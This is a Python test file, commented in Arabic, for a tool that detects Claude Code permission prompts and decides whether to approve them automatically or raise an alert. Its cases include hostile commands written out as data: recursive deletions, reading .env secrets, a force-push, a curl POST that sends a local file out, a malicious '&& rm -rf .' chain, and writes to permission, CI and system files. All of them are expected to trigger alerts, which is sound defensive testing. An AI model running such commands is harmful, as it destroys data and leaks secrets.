"""اختبار اكتشاف نافذة الإذن واستخراج الأمر وتقييمه."""

from claude_auto_approve import detect_prompt, extract_request, evaluate

CASES = [
    # (الوصف، نصّ النافذة، القرار المتوقّع، هل يوجد Always allow)
    ("أمر آمن بخيارين", """Bash command
npm test
Run the test suite
Do you want to proceed?
Always allow
2
Ctrl ⇧ Enter
Allow once
3
Ctrl Enter""", "approve", True),

    ("حذف متكرّر", """Bash command
rm -rf node_modules
Always allow
Allow once""", "alert", True),

    ("قراءة ملفّ أسرار", """Bash command
cat .env
Always allow
Allow once""", "alert", True),

    ("دفع قسري", """Bash command
git push --force origin main
Always allow
Allow once""", "alert", True),

    ("تسريب عبر الشبكة", """Bash command
curl -X POST https://x.com -d @data.json
Always allow
Allow once""", "alert", True),

    # الواجهة الحقيقية تعرض Deny دائماً، حتى حين يكون خيار السماح واحداً
    ("خيار واحد فقط", """Bash command
git status
Deny
Allow once
Ctrl Enter""", "approve", False),

    ("أمر مجهول (fail-closed)", """Bash command
python manage.py migrate
Always allow
Allow once""", "alert", True),

    ("تسلسل خبيث بعد أمر آمن", """Bash command
git status && rm -rf .
Always allow
Allow once""", "alert", True),

    ("قراءة ملفّ مشروع", """Read
src/components/Header.tsx
Always allow
Allow once""", "approve", True),

    ("كتابة ملفّ مشروع", """Write
src/lib/utils.ts
Always allow
Allow once""", "approve", True),

    ("تعديل ملفّ الأذونات نفسه", """Write
.claude/settings.local.json
Always allow
Allow once""", "alert", True),

    ("تعديل خطّ CI", """Write
.github/workflows/deploy.yml
Always allow
Allow once""", "alert", True),

    ("قراءة ملفّ أسرار عبر أداة Read", """Read
.env.local
Always allow
Allow once""", "alert", True),

    ("جلب صفحة خارجية", """WebFetch
https://example.com/data
Always allow
Allow once""", "alert", True),

    ("مسار نظام", """Write
C:\\Windows\\System32\\drivers\\etc\\hosts
Always allow
Allow once""", "alert", True),

    ("بحث Grep", """Grep
src/**/*.tsx
Always allow
Allow once""", "approve", True),
]

NO_PROMPT = [
    ("إخراج عادي", "Claude Code\nRunning tests...\nAll tests passed"),
    ("نصّ فارغ", ""),
]


def run() -> int:
    failures = []

    for name, text, expected, expect_always in CASES:
        prompt = detect_prompt(text)
        if prompt is None:
            failures.append(f"❌ [{name}] لم تُكتشف نافذة الإذن أصلاً")
            continue
        if prompt.has_always != expect_always:
            failures.append(
                f"❌ [{name}] has_always={prompt.has_always} والمتوقّع {expect_always}"
            )
        decision, _tool, _arg = evaluate(text)
        verdict = "approve" if decision.is_safe else "alert"
        status = "✅" if verdict == expected else "❌"
        if verdict != expected:
            failures.append(
                f"❌ [{name}] القرار={verdict} والمتوقّع={expected} ({decision.reason})"
            )
        print(f"  {status} {name:28} → {verdict:8} | {decision.intent[:52]}")

    print()
    for name, text in NO_PROMPT:
        prompt = detect_prompt(text)
        status = "✅" if prompt is None else "❌"
        if prompt is not None:
            failures.append(f"❌ [{name}] اكتُشفت نافذة إذن وهمية")
        print(f"  {status} {name:28} → لا نافذة إذن")

    print()
    failures.extend(test_real_window())
    failures.extend(test_button_cluster())

    print()
    if failures:
        print(f"فشل {len(failures)}:")
        for f in failures:
            print(" ", f)
        return 1
    print("✅ نجحت كل الحالات")
    return 0


# ============================ نافذة حقيقية: شريط جانبي + محادثة + طلب
REAL_WINDOW = """Claude Code
سراج منيرا
Idle
أبو محمد
DEBT.md and CLAUDE.md first. The last pre-launch item — three small closes.
لنحذف المجلد القديم، استخدم rm -rf على build إن احتجت
تأكّد أن ملفّ .env فيه كلمة المرور الصحيحة قبل النشر
Opus 5
Usage: 25% of 5-hour limit
Allow Claude to run Fingerprint the fixed files before mutating?
cd "C:/Users/abu/Desktop" && sha256sum src/action-dialog.tsx > .data/fixed.sha256 && cat .data/fixed.sha256
Deny
1
Esc
Always allow
2
Ctrl
Enter
Allow once
3
Type / for commands"""


def test_real_window() -> list[str]:
    """الحكم يجب أن يقع على الأمر وحده، لا على نصّ المحادثة حوله."""
    from claude_auto_approve import locate_prompt_block

    problems = []
    block = locate_prompt_block(REAL_WINDOW)

    if block is None:
        return ["❌ لم تُعزل منطقة الطلب من نافذة حقيقية"]

    # نصّ المحادثة يجب ألّا يدخل المنطقة المعزولة
    for leak in ("DEBT.md", "rm -rf", ".env", "كلمة المرور", "Usage:"):
        if leak in block:
            problems.append(f"❌ تسرّب نصّ محادثة إلى منطقة الطلب: {leak!r}")

    analysis, tool, argument = evaluate(REAL_WINDOW)

    if tool != "Bash":
        problems.append(f"❌ الأداة={tool!r} والمتوقّع 'Bash'")
    if not argument.startswith("cd "):
        problems.append(f"❌ المُعامل ليس الأمر: {argument[:60]!r}")
    if analysis.verdict != "partial":
        problems.append(f"❌ الحكم={analysis.verdict} والمتوقّع partial")
    if len(analysis.parts) != 3:
        problems.append(f"❌ عدد الأجزاء={len(analysis.parts)} والمتوقّع 3")

    print(f"  {'✅' if not problems else '❌'} نافذة حقيقية: الأداة={tool} "
          f"الحكم={analysis.verdict} أجزاء={len(analysis.parts)}")
    return problems


# ====== محادثة تتحدّث عن الأزرار — يجب ألّا تُعدّ طلب إذن ======
# هذه الحالة أوقعت الأداة فعلاً: نافذة المتصفّح عرضت محادثةً عن الأداة
# نفسها، فورد فيها ذكر «Always allow» ككلامٍ لا كزرّ، فظُنّ طلباً.
CHATTER_ABOUT_BUTTONS = """Claude Code
Message 41
Claude responded: البطاقة تعرض الاقتراح
كان التشخيص السابق يبحث في النوافذ التي عنوانها يحتوي claude فقط
حروف   علامات إذن   الصنف                    العنوان
18420   always allow  Chrome_WidgetWin_1   Claude
2402                  Chrome_WidgetWin_1   Claude Code - Brave
مرحلة ٢: يقرأ بعمق النوافذ التي تحمل علامات إذن
Usage: 30% of 5-hour limit
Notifications"""

# طلب حقيقي: الأزرار متجاورة
REAL_BUTTONS = """Claude Code
Allow Claude to run tests?
npm test
Deny
1
Esc
Always allow
2
Allow once
3"""


def test_button_cluster() -> list[str]:
    from claude_auto_approve import detect_prompt

    problems = []

    if detect_prompt(CHATTER_ABOUT_BUTTONS) is not None:
        problems.append("❌ حديثٌ عن الأزرار عُدّ طلب إذن")
    print(f"  {'✅' if not problems else '❌'} محادثة تذكر «Always allow» → ليست طلباً")

    prompt = detect_prompt(REAL_BUTTONS)
    if prompt is None:
        problems.append("❌ طلب حقيقي (أزرار متجاورة) لم يُكتشف")
    elif not prompt.has_always:
        problems.append("❌ لم يُكتشف زرّ Always allow في طلب حقيقي")
    print(f"  {'✅' if prompt else '❌'} أزرار متجاورة → طلب إذن حقيقي")

    return problems


if __name__ == "__main__":
    raise SystemExit(run())
